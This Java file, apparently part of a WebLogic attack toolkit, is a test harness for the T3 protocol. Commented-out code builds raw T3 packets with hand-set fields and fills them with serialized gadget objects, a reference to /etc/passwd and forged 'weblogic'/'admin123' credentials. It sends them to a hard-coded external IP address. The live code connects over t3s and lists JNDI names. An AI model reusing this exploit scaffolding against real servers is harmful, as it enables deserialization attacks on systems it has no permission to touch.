package com.supeream.weblogic;

import com.supeream.Main;
import com.supeream.payload.RemoteImpl;
import com.supeream.serial.BytesOperation;
import com.supeream.serial.SerialDataGenerator;
import com.supeream.serial.Serializables;
import com.supeream.ssl.SocketFactory;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;
import weblogic.apache.org.apache.velocity.runtime.Runtime;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.internal.NamingNode;
import weblogic.protocol.Identity;
import weblogic.rjvm.JVMID;
import weblogic.rmi.cluster.ClusterableRemoteObject;
import weblogic.rmi.cluster.ReplicaAwareRemoteObject;
import weblogic.security.acl.internal.AuthenticatedUser;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingEnumeration;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.Socket;
import java.rmi.Remote;

/**
 * Created by nike on 17/6/28.
 */
public class T3Test {

    public static void main(String[] args) throws Exception {


//        Options options = new Options();
//        options.addOption("https",false,"xx");
//        CommandLineParser parser = new DefaultParser();
//        Main.cmdLine = parser.parse(options, args);
//
//        Socket s = SocketFactory.newSocket("77.246.34.226", 443);
//        //AS ABBREV_TABLE_SIZE HL remoteHeaderLength 鐢ㄦ潵鍋歴kip鐨�
//        String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";
//        s.getOutputStream().write(header.getBytes());
//        s.getOutputStream().flush();
//        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
//        String versionInfo = br.readLine();
//        String asInfo = br.readLine();
//        String hlInfo = br.readLine();
//
//        System.out.println(versionInfo + "\n" + asInfo + "\n" + hlInfo);

//
//        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1
//
//
//        //t3 protocol
//        String cmd = "09";
//        String qos = "65";
//        String flags = "01";
//        String responseId = "ffffffff";
//        String invokableId = "ffffffff";
//        String abbrevOffset = "00000022";//16+3=19+4+4+1=28+1+1+5348=5378-4=000014fe 30+8-4
//
//
//        String countLength = "02";
//        String capacityLength = "10";//蹇呴』澶т簬涓婇潰璁剧疆鐨凙S鍊�
//        String readObjectType = "00";//00 object deserial 01 ascii
//
//        StringBuilder dataS = new StringBuilder();
//        dataS.append(cmd);
//        dataS.append(qos);
//        dataS.append(flags);
//        dataS.append(responseId);
//        dataS.append(invokableId);
//        dataS.append(abbrevOffset);
//
//        //RemotePeriodLength
//        dataS.append("00000001");
//        //PublickeySize
//        dataS.append("00000001");
//        System.out.println(Integer.toHexString(115));
//        dataS.append("0001");
//
//        byte[] phase1 = Serializables.serialize(new File("/etc/passwd"));
//        System.out.println("payloadlength="+(phase1.length));
//        String pahse1Str = BytesOperation.bytesToHexString(phase1);
//        System.out.println("pahse1Str="+pahse1Str);
//        dataS.append(pahse1Str.substring(8));
//
//        countLength = "04";
//        dataS.append(countLength);
//
//
//        //define IRemote.class class by byte[]
////        byte[] phase1 = SerialDataGenerator.serialRmiDatas(new String[]{"install"});
////        String pahse1Str = BytesOperation.bytesToHexString(phase1);
////        datas.append(capacityLength);
////        datas.append(readObjectType);
////        datas.append(pahse1Str);
//
//
//
//        //for compatiable fo hide
//        Class x = Class.forName("weblogic.rjvm.ClassTableEntry");
//
//        Class xxf = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        ObjectStreamClass objectStreamClass = ObjectStreamClass.lookup(xxf);
//        Constructor f = x.getDeclaredConstructor(ObjectStreamClass.class, String.class);
//
//        f.setAccessible(true);
//        Object xx = f.newInstance(objectStreamClass,"");
//
//        String phase41 = BytesOperation.bytesToHexString(Serializables.serialize(xx));
//        dataS.append(capacityLength);
//        dataS.append(readObjectType);
//        dataS.append(phase41);
//
//
//        //for compatiable fo hide
//        AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "admin123");
//        String phase4 = BytesOperation.bytesToHexString(Serializables.serialize(authenticatedUser));
//        dataS.append(capacityLength);
//        dataS.append(readObjectType);
//        dataS.append(phase4);
//
//        JVMID dst = new JVMID();
//
//        Constructor constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,boolean.class);
//        constructor.setAccessible(true);
//        dst = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
//        Field serverName = dst.getClass().getDeclaredField("differentiator");
//        serverName.setAccessible(true);
//        serverName.set(dst,0);
//
//        serverName = dst.getClass().getDeclaredField("transientIdentity");
//        serverName.setAccessible(true);
//        serverName.set(dst,new Identity(1000l));
//
//        dataS.append(capacityLength);
//        dataS.append(readObjectType);
//        dataS.append(BytesOperation.bytesToHexString(Serializables.serialize(dst)));
//
//        JVMID src = new JVMID();
//
//        constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,boolean.class);
//        constructor.setAccessible(true);
//        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
//        serverName = src.getClass().getDeclaredField("differentiator");
//        serverName.setAccessible(true);
//        serverName.set(dst,0);
//
//        serverName = src.getClass().getDeclaredField("transientIdentity");
//        serverName.setAccessible(true);
//        serverName.set(src,new Identity(1000l));
//
//        dataS.append(capacityLength);
//        dataS.append(readObjectType);
//        dataS.append(BytesOperation.bytesToHexString(Serializables.serialize(src)));
//
//
//
////        RemotePeriodLength
//        int remotePeriodLength = Integer.MAX_VALUE;
//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
//        DataOutputStream dos = new DataOutputStream(bos);
//        dos.writeInt(remotePeriodLength);
//        dos.flush();
//        dos.close();
//        System.out.println(BytesOperation.bytesToHexString(bos.toByteArray()));
//
//        System.out.println(dataS.toString());
//
//        byte[] headers = BytesOperation.hexStringToBytes(dataS.toString());
//
//
//        int len = headers.length + 4;
//        String hexLen = Integer.toHexString(len);
//
//        StringBuilder dataLen = new StringBuilder();
//        if (hexLen.length() < 8) {
//            for (int i = 0; i < (8 - hexLen.length()); i++) {
//                dataLen.append("0");
//            }
//        }
//
//        dataLen.append(hexLen);
//        System.out.println("length="+dataLen);
//
//        s.getOutputStream().write(BytesOperation.hexStringToBytes(dataLen + dataS.toString()));
//        s.getOutputStream().flush();
//
//        System.out.println("result="+br.readLine());
//        s.close();

        System.setProperty("weblogic.rjvm.enableprotocolswitch","true");
        System.setProperty("UseSunHttpHandler","true");
        System.setProperty("ssl.SocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");
        System.setProperty("ssl.ServerSocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");



        Context initialContext = Main.getInitialContext("t3s://" + "127.0.0.1" + ":" + 7001);
//        Context initialContext = Main.getInitialContext("t3://" + "10.211.55.5" + ":" + 7001);

//        NamingNode remote = (NamingNode) initialContext.lookup("weblogic");
//        System.out.println(remote.toString());

//        System.out.println(initialContext.);
        System.out.println(initialContext.getEnvironment());
        NamingEnumeration namingEnumeration = initialContext.list("");
        while (namingEnumeration.hasMoreElements()) {
            System.out.println(namingEnumeration.next().getClass().getName());

        }

//        weblogic.jndi.internal.WLContextImpl serverNamingNode = (weblogic.jndi.internal.WLContextImpl) initialContext.lookup("weblogic");

    }
}
